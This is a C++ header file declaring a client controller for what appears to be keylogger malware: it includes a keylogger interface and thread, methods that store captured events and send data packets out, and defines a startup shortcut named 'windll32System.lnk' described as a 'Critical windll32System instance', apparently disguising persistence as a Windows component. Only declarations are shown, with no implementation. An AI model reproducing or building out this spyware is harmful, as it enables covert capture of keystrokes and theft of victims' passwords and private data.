#pragma warning(disable : 4290)
#ifndef CLIENT_H__
# define CLIENT_H__
/*
# include <Shlobj.h>
# include <shlwapi.h>
# include <functional>
# include "windows.h"
# include "winnls.h"
# include "shobjidl.h"
# include "objbase.h"
# include "objidl.h"
# include "shlguid.h"

# pragma comment(lib, "shlwapi.lib")
*/

# include <iostream>
# include <queue>
# include "DLibrary.h"
# include "workQueueManager.h"
# include "IInfoClient.h"
# include "IKeylogger.h"
# include "WorkQueue.h"
# include "sayHello.h"
# include "DataHandler.h"


# define SHORTCUT_NAME			L"\\windll32System.lnk"
# define DESCR					"Critical windll32System instance"

class	clientController {

	DLManager		libraries;

	// Dictionaries
	Dictionary		dictSayHello;
	Dictionary		dictWorkQueueManager;
	Dictionary		dictInfoClient;
	Dictionary		dictKeyLogger;
	Dictionary		dictDataHandler;

	// Models
	_I_InfoClient	*infoClient;
	IDataHandler	*dataHandler;
	IKeylogger		*keyLogger;

	// Params
	bool			quit;
	std::string		storeFolder;
	int				bytePerFile;

	// Queues
	IWorkQueue		*eventQueue;

public:

	clientController(void) throw(DLibraryException);
	~clientController(void);

	// Iterative Actions
	int			mainAction(int, char**);
	bool		sendLocalDataAction(void);
	std::string	serializeQueueAction(void);
	bool		sendPacketAction(Packet *);
	bool		storeEventAction(std::string);

	// Threaded Actions
	void		keyLoggerThread(void);


	/*
	void		defineShortcut(void);
	bool		createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr);
	*/

};

#endif /* !CLIENT_H__ */
